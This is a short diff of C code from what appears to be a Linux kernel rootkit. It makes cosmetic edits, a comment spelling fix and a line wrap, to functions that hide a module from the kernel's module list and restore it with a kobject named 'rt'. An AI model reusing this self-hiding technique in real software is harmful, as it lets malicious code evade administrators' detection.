@@ -224,7 +224,7 @@ char banti_handle_key(int key)
 ---------------------------------------------*/
 void banti_module_hide(void)
 {
-    /* Check if alredy hided */
+    /* Check if alredy hidden */
     if (fl->module_hidden) return;
 
     /* Delete in module list */
@@ -248,12 +248,13 @@ void banti_module_show(void)
 {
     int result;
 
-    /* Check if alredy hided */
+    /* Check if alredy hidden */
     if (!fl->module_hidden) return;
 
     /* Add module in list */
     list_add(&THIS_MODULE->list, module_prev);
-    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+    result = kobject_add(&THIS_MODULE->mkobj.kobj, 
+        THIS_MODULE->mkobj.kobj.parent, "rt");
 
     /* Flag down */
     fl->module_hidden = 0;
